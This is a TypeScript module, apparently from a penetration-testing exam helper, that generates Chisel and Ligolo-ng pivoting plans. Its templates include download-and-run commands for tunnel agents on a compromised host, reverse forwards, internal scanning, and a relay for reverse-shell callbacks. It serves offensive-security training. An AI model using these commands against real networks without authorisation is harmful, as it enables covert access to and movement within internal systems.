export type TunnelTool = "chisel" | "ligolo";
export type PivotOs = "linux" | "windows";
export type ChiselMode = "socks" | "port" | "loopback";

export type TunnelInput = {
  tool: TunnelTool;
  os: PivotOs;
  kali: string;
  pivot: string;
  filePort: string;
  chiselMode: ChiselMode;
  chiselPort: string;
  localPort: string;
  internal: string;
  internalPort: string;
  proxyPort: string;
  subnet: string;
  host: string;
  callback: boolean;
  callbackPort: string;
  penelopePort: string;
  loopback: boolean;
  loopPort: string;
};

export type Step = {
  side: "Kali" | "Pivot" | "Proxy";
  title: string;
  why: string;
  cmd: string;
};

export type GraphNode = {
  name: string;
  addr: string;
  role: string;
};

/** Two directed paths between the three machines. `backLive` is the return path. */
export type TunnelGraph = {
  kali: GraphNode;
  pivot: GraphNode;
  far: GraphNode;
  dial: string;
  reachTop: string;
  reachBottom: string;
  backUpper: string;
  backLower: string;
  backLive: boolean;
};

export type TunnelPlan = {
  summary: string;
  graph: TunnelGraph;
  steps: Step[];
  notes: string[];
};

function ipv4(value: string): string {
  const target = value.trim();
  if (!/^(?:\d{1,3}\.){3}\d{1,3}$/.test(target)) return "";
  const parts = target.split(".").map((part) => Number(part));
  if (parts.some((part) => part > 255)) return "";
  if (target === "0.0.0.0" || target === "255.255.255.255" || target === "169.254.169.254") return "";
  return target;
}

function routable(value: string): string {
  const ip = ipv4(value);
  if (!ip) return "";
  const [a, b] = ip.split(".").map(Number);
  if (a === 127 || a >= 224) return "";
  if (a === 169 && b === 254) return "";
  return ip;
}

function ipNote(raw: string, label: string): string | null {
  const text = raw.trim();
  if (!text || routable(text)) return null;
  const ip = ipv4(text);
  if (ip.startsWith("127.")) {
    return `${label} is not 127.0.0.1. That address means a different machine on Kali and on the victim. Use the loopback option for a service bound on the victim.`;
  }
  if (ip.startsWith("169.254.")) return `${label} is link-local. Use the address you can already reach.`;
  if (ip && Number(ip.split(".")[0]) >= 224) return `${label} is not a host you can dial.`;
  return `${label} is not a single IPv4 address yet.`;
}

function port(value: string): string {
  if (!/^\d+$/.test(value.trim())) return "";
  const n = Number(value);
  return n >= 1 && n <= 65535 ? String(n) : "";
}

function portNote(raw: string, label: string, fallback: string): { value: string; note: string | null } {
  const text = raw.trim();
  const value = port(text);
  if (!text) return { value: fallback, note: null };
  if (!value) return { value: fallback, note: `${label} is not a port from 1 to 65535. The command uses ${fallback} until it is.` };
  return { value, note: null };
}

function cidr(value: string): string {
  const raw = value.trim();
  const match = raw.match(/^((?:\d{1,3}\.){3}\d{1,3})\/(\d{1,2})$/);
  if (!match) return "";
  const ip = ipv4(match[1]);
  if (!ip) return "";
  const [a, b] = ip.split(".").map(Number);
  if (a === 127 || a >= 224 || (a === 169 && b === 254)) return "";
  const bits = Number(match[2]);
  if (bits < 8 || bits > 30) return "";
  return `${ip}/${bits}`;
}

function cidrNote(raw: string): string | null {
  const text = raw.trim();
  if (!text || cidr(text)) return null;
  if (text.startsWith("127.")) return "Do not route 127 into the tunnel. That black-holes Kali. The victim's loopback is the loopback option, which uses 240.0.0.1.";
  const head = text.split("/")[0] ?? "";
  const ip = ipv4(head);
  if (ip && Number(ip.split(".")[0]) >= 224) {
    return "Do not type 240.0.0.0/4 as the subnet. 240.0.0.1 is added by the loopback option, and only after start.";
  }
  return "The subnet should look like 172.16.0.0/24. One host, or a prefix outside /8 to /30, is not a route.";
}

function hostPort(ip: string, p: string): string {
  return p === "80" ? ip : `${ip}:${p}`;
}

export function tunnelPlan(input: TunnelInput): TunnelPlan {
  const kali = routable(input.kali) || "<KALI>";
  const pivot = routable(input.pivot) || "<PIVOT>";
  const file = portNote(input.filePort, "The file server port", "80");
  const notes: string[] = [];
  const kaliNote = ipNote(input.kali, "The Kali address");
  const pivotNote = ipNote(input.pivot, "The pivot address");
  if (kaliNote) notes.push(kaliNote);
  if (pivotNote) notes.push(pivotNote);
  if (file.note) notes.push(file.note);

  if (input.tool === "chisel") return chiselPlan(input, kali, pivot, file.value, notes);
  return ligoloPlan(input, kali, pivot, file.value, notes);
}

function chiselPlan(input: TunnelInput, kali: string, pivot: string, filePort: string, notes: string[]): TunnelPlan {
  const listen = portNote(input.chiselPort, "The Chisel port", "8000");
  const local = portNote(input.localPort, "The Kali local port", "8081");
  const dest = portNote(input.internalPort, "The port on the far side", "80");
  const socks = input.chiselMode === "socks";
  const loopback = input.chiselMode === "loopback";
  const far = loopback ? "127.0.0.1" : routable(input.internal) || "<INTERNAL>";
  if (listen.note) notes.push(listen.note);
  if (!socks && local.note) notes.push(local.note);
  if (!socks && dest.note) notes.push(dest.note);
  if (listen.value === filePort) notes.push("The file server and the Chisel port are the same. Move one of them, or the second bind fails.");
  if (!socks && local.value === listen.value) {
    notes.push("The Kali local port and the Chisel server port are the same. The forward cannot bind. Pick another local port.");
  }
  if (!loopback) {
    const hostNote = ipNote(input.internal, socks ? "The host to scan" : "The internal host");
    if (hostNote) notes.push(hostNote);
  } else if (!input.internalPort.trim()) {
    notes.push("Set the port bound to 127.0.0.1 on the victim. The command uses 80 until you do.");
  }

  const forward = socks ? "R:socks" : `R:${local.value}:${far}:${dest.value}`;
  const client =
    input.os === "linux"
      ? `/tmp/chisel client ${kali}:${listen.value} ${forward}`
      : `C:\\Users\\Public\\chisel.exe client ${kali}:${listen.value} ${forward}`;
  const fetchCmd =
    input.os === "linux"
      ? `curl -o /tmp/chisel http://${hostPort(kali, filePort)}/chisel && chmod +x /tmp/chisel`
      : `certutil -urlcache -split -f http://${hostPort(kali, filePort)}/chisel.exe C:\\Users\\Public\\chisel.exe`;
  const probe =
    input.os === "linux"
      ? `curl -m 3 -o /dev/null http://${hostPort(kali, filePort)}/`
      : `curl.exe -m 3 -o NUL http://${hostPort(kali, filePort)}/`;
  const binary = input.os === "linux" ? "chisel" : "chisel.exe";
  const findLoop = input.os === "linux" ? "ss -tlnp | grep 127.0.0.1" : "netstat -ano | findstr 127.0.0.1";
  const use = socks
    ? `# the last line of /etc/proxychains4.conf must be this, and the localnet skips must not cover the exam ranges\n# socks5 127.0.0.1 1080\nproxychains -q nmap -Pn -sT -p 22,80,445,3389,5985 ${far}`
    : `# On Kali, connect to 127.0.0.1 port ${local.value}\n# The pivot connects to ${far} port ${dest.value}\n# HTTP only:\ncurl -sI http://127.0.0.1:${local.value}/\n# any other protocol: point that client at 127.0.0.1 port ${local.value}`;

  const steps: Step[] = [
    {
      side: "Kali",
      title: "Start the listener, and leave it running",
      why: "The pivot dials in. Nothing is listening yet if you start the client first, and the error is connection refused, which is not a bad binary. --reverse means the port you will use is created on Kali. This window stays open for as long as the tunnel should live.",
      cmd: `chisel server -p ${listen.value} --reverse`,
    },
    {
      side: "Kali",
      title: "Confirm the release binary, then serve it",
      why: `file must say ELF for a Linux pivot or PE32+ for 64-bit Windows. A file of a few hundred bytes, or one that starts with <html, is the download page. Serve ${binary} from this port only after file looks right. Do not upload the source tree.`,
      cmd: `file ${binary}\npython3 -m http.server ${filePort}`,
    },
    {
      side: "Pivot",
      title: "Prove the pivot can reach that Kali address",
      why: "The client uses the same path as this request. Three seconds is the limit. A hang means the pivot has no route to your VPN address, and uploading Chisel again will hang the same way. Stop. A callback then has to land on this pivot, not on Kali.",
      cmd: probe,
    },
  ];

  if (loopback) {
    steps.push({
      side: "Pivot",
      title: "Confirm the service is bound to the victim's loopback",
      why: "0.0.0.0, or [::], means every interface. You may already have scanned that port from Kali. 127.0.0.1 means this host only, which is why nmap from the VPN never saw it. The port in the next command is the port on this line, not a port you guessed.",
      cmd: findLoop,
    });
  }

  steps.push(
    {
      side: "Pivot",
      title: socks ? "Ask Kali for a SOCKS proxy" : loopback ? "Forward the victim's 127.0.0.1" : "Forward one port the pivot can see",
      why: socks
        ? "R:socks opens 127.0.0.1:1080 on Kali. A connection there leaves from the pivot, so you see networks the pivot can already see. You do not get a route, and hosts over there still cannot dial Kali. proxychains to 127.0.0.1 is Kali itself. A service bound only on the victim is the loopback mode, not this one."
        : loopback
          ? `R:${local.value}:127.0.0.1:${dest.value} is read on the victim. 127.0.0.1 in that command is the victim's loopback. After it connects, Kali's own 127.0.0.1:${local.value} is that same service. Those are two different machines that happen to share an address. SOCKS cannot make this hop.`
          : `R:${local.value}:${far}:${dest.value} listens on Kali port ${local.value}. The pivot then connects to ${far} port ${dest.value}. That address is from the pivot's view, so it can be the pivot's LAN address or a second host. If the listener was 127.0.0.1, this is the wrong mode: the LAN address will not hit a loopback socket.`,
      cmd: `${fetchCmd}\n${client}`,
    },
    {
      side: "Kali",
      title: socks ? "Use proxychains, and do not trust a SYN scan" : "Use the port that appeared on Kali",
      why: socks
        ? "Tools do not enter the tunnel unless proxychains is in front of them, and the config must end in socks5 127.0.0.1 1080. The default file skips 10/8, 172.16/12, and 192.168/16, which are the exam networks, so the tunnel looks dead while the packets go direct. nmap through SOCKS is -sT. -sS never enters the proxy and reports ports open when they are closed."
        : `Connect to 127.0.0.1 port ${local.value} on Kali. Do not connect to the pivot's address for this step: the tunnel already did that. curl -sI only makes sense when the service is HTTP. MySQL, SMB, and a debug port need their own client, aimed at that same Kali port. Close the server window when the host is done.`,
      cmd: use,
    },
  );

  const graph: TunnelGraph = {
    kali: { name: "Kali", addr: kali, role: `chisel server :${listen.value}` },
    pivot: { name: "Pivot", addr: pivot, role: `${input.os} client` },
    far: socks
      ? { name: "Reached", addr: far === "<INTERNAL>" ? "hosts it can see" : far, role: "TCP via SOCKS" }
      : loopback
        ? { name: "Victim loopback", addr: `127.0.0.1:${dest.value}`, role: "not Kali's loopback" }
        : { name: "One port", addr: `${far}:${dest.value}`, role: `on Kali :${local.value}` },
    dial: `dials :${listen.value}`,
    reachTop: socks ? "SOCKS :1080" : `Kali :${local.value}`,
    reachBottom: socks ? "proxychains -sT" : loopback ? "their 127.0.0.1" : "one service",
    backUpper: "",
    backLower: "no path back",
    backLive: false,
  };

  return {
    summary: socks
      ? "Chisel SOCKS lets Kali open TCP ports on hosts the pivot can already reach. It is not a route, it cannot see a service bound to the victim's 127.0.0.1, and nothing on the far side can dial Kali."
      : loopback
        ? `Chisel puts the victim's 127.0.0.1:${dest.value} onto Kali's 127.0.0.1:${local.value}. Your tools stay on Kali and talk to Kali's loopback. The victim's loopback is a different machine.`
        : "Chisel puts one service the pivot can see onto a Kali localhost port. It does not give you the rest of the subnet, and it does not let the far side call back.",
    graph,
    steps,
    notes,
  };
}

function ligoloPlan(input: TunnelInput, kali: string, pivot: string, filePort: string, notes: string[]): TunnelPlan {
  const proxy = portNote(input.proxyPort, "The proxy port", "11601");
  const callback = portNote(input.callbackPort, "The port on the pivot", "443");
  const penelope = portNote(input.penelopePort, "The Penelope port", "443");
  const loop = portNote(input.loopPort, "The loopback port", "<PORT>");
  const subnet = cidr(input.subnet) || "<SUBNET>";
  const host = routable(input.host) || "<HOST>";
  const subnetProblem = cidrNote(input.subnet);
  if (subnetProblem) notes.push(subnetProblem);
  const hostNote = ipNote(input.host, "The host to scan");
  if (hostNote) notes.push(hostNote);
  if (proxy.note) notes.push(proxy.note);
  if (proxy.value === filePort) notes.push("The file server and the Ligolo proxy port are the same. Move one of them.");
  if (input.callback && callback.note) notes.push(callback.note);
  if (input.callback && penelope.note) notes.push(penelope.note);
  if (input.loopback && input.loopPort.trim() && loop.note) notes.push(loop.note);
  if (input.loopback && !input.loopPort.trim()) {
    notes.push("Set the port that ss or netstat showed on 127.0.0.1. 240.0.0.1 without a port is the whole loopback, which is a slow nmap.");
  }

  const binary = input.os === "linux" ? "agent" : "agent.exe";
  const fetchCmd =
    input.os === "linux"
      ? `curl -o /tmp/agent http://${hostPort(kali, filePort)}/agent && chmod +x /tmp/agent\n/tmp/agent -connect ${kali}:${proxy.value} -ignore-cert`
      : `certutil -urlcache -split -f http://${hostPort(kali, filePort)}/agent.exe C:\\Users\\Public\\agent.exe\nC:\\Users\\Public\\agent.exe -connect ${kali}:${proxy.value} -ignore-cert`;
  const probe =
    input.os === "linux"
      ? `curl -m 3 -o /dev/null http://${hostPort(kali, filePort)}/`
      : `curl.exe -m 3 -o NUL http://${hostPort(kali, filePort)}/`;
  const loopPort = input.loopPort.trim() ? loop.value : "<PORT>";

  const steps: Step[] = [
    {
      side: "Kali",
      title: "Create the tun device once per boot",
      why: "Ligolo moves packets through an interface named ligolo, owned by you. If the add says file exists, the interface is already there. Do not add a second one, and do not delete it just because a scan failed. Leave it up.",
      cmd: "sudo ip tuntap add user $USER mode tun ligolo\nsudo ip link set ligolo up",
    },
    {
      side: "Kali",
      title: "Start the proxy before the agent",
      why: "The agent dials this port. -selfcert makes the certificate so you do not bring one, and -ignore-cert on the agent is what accepts it. Leave this window open. session and start are typed here, not in a shell. Starting the agent first produces connection refused.",
      cmd: `./proxy -selfcert -laddr 0.0.0.0:${proxy.value}`,
    },
    {
      side: "Kali",
      title: "Confirm the agent binary, then serve it",
      why: "file must say ELF or PE, and the size must match the release you downloaded. The GitHub HTML page is a few hundred bytes and is not an agent. Match the pivot: Linux gets the ELF, 64-bit Windows gets the 64-bit exe.",
      cmd: `file ${binary}\npython3 -m http.server ${filePort}`,
    },
    {
      side: "Pivot",
      title: "Prove the pivot can reach that Kali address",
      why: "The agent uses the same path as this request. A hang means it will hang too. Do not keep re-uploading it. A host that cannot see Kali has to connect to this pivot instead, which is the callback step.",
      cmd: probe,
    },
    {
      side: "Pivot",
      title: "The agent joins. It does not scan anything",
      why: "-connect is the proxy you just started. -ignore-cert accepts the certificate from -selfcert. The process sitting here is only a session. It does not add a route, and it does not open the subnet or the victim's loopback.",
      cmd: fetchCmd,
    },
    {
      side: "Proxy",
      title: "Select the session, then start",
      why: "Both words are typed in the proxy window. start is what builds the tunnel. A route added before this line points at an interface that is not carrying packets yet, which looks exactly like a dead subnet. If start says the interface is already in use, you already have a tunnel on it.",
      cmd: "session\nstart",
    },
    {
      side: "Kali",
      title: "Route the subnet after start",
      why: `This sends ${subnet} into the tun device. It is the network you saw on the pivot's ip a or ipconfig, not your VPN range and not 127.0.0.0/8. After the route, nmap and nxc are ordinary commands. Ligolo does not read proxychains4.conf. Delete the route when the subnet is finished, and leave the tun device.`,
      cmd: `sudo ip route add ${subnet} dev ligolo\nnmap -Pn -sC -sV -p 22,80,445,3389,5985 ${host}\n# when finished\nsudo ip route del ${subnet}`,
    },
  ];

  if (input.loopback) {
    steps.push({
      side: "Kali",
      title: "Their loopback is 240.0.0.1",
      why: `Ligolo treats 240.0.0.1 as the agent's 127.0.0.1. Add this route after start, same as the subnet. Your tools then use 240.0.0.1, never 127.0.0.1, because 127.0.0.1 on Kali is Kali. Do not route 127.0.0.0/8 into the tun device or Kali loses its own loopback. Port ${loopPort} is the port ss or netstat showed bound to 127.0.0.1 on the victim.`,
      cmd: `sudo ip route add 240.0.0.1/32 dev ligolo\nnmap -Pn -sT -p ${loopPort} 240.0.0.1\n# HTTP only:\ncurl -sI http://240.0.0.1:${loopPort}/`,
    });
  }

  if (input.callback) {
    steps.push({
      side: "Proxy",
      title: "Open a port on the pivot for a callback",
      why: `The route lets you reach them. It does not let them reach Kali. This opens ${callback.value} on the pivot and carries it to Penelope on Kali port ${penelope.value}. The payload LHOST is ${pivot}, not ${kali}, and not 127.0.0.1. If the pivot already serves something on ${callback.value}, pick another port on both sides. Type this in the proxy window, after start.`,
      cmd: `listener_add --addr 0.0.0.0:${callback.value} --to 127.0.0.1:${penelope.value} --tcp\nlistener_list`,
    });
  }

  const graph: TunnelGraph = {
    kali: { name: "Kali", addr: kali, role: `tun ligolo · ${subnet}` },
    pivot: { name: "Pivot", addr: pivot, role: `${input.os} agent` },
    far: input.loopback && subnet === "<SUBNET>"
      ? { name: "Victim loopback", addr: "240.0.0.1", role: "their 127.0.0.1" }
      : { name: "Subnet", addr: subnet, role: host === "<HOST>" ? "normal tools" : host },
    dial: `dials :${proxy.value}`,
    reachTop: "route on tun",
    reachBottom: input.loopback ? "240.0.0.1 too" : "no proxychains",
    backUpper: input.callback ? `Penelope :${penelope.value}` : "",
    backLower: input.callback ? `to pivot :${callback.value}` : "no path back",
    backLive: input.callback,
  };

  const loopSentence = input.loopback
    ? " 240.0.0.1 on that interface is the victim's 127.0.0.1. Do not route 127 itself."
    : " The far side cannot dial your VPN address until you add a listener.";

  return {
    summary: input.callback
      ? `Ligolo gives Kali a real route into the subnet, plus one port on the pivot that forwards a callback to Penelope.${loopSentence}`
      : `Ligolo gives Kali a real route into one subnet. nmap and nxc run with no proxychains.${loopSentence}`,
    graph,
    steps,
    notes,
  };
}
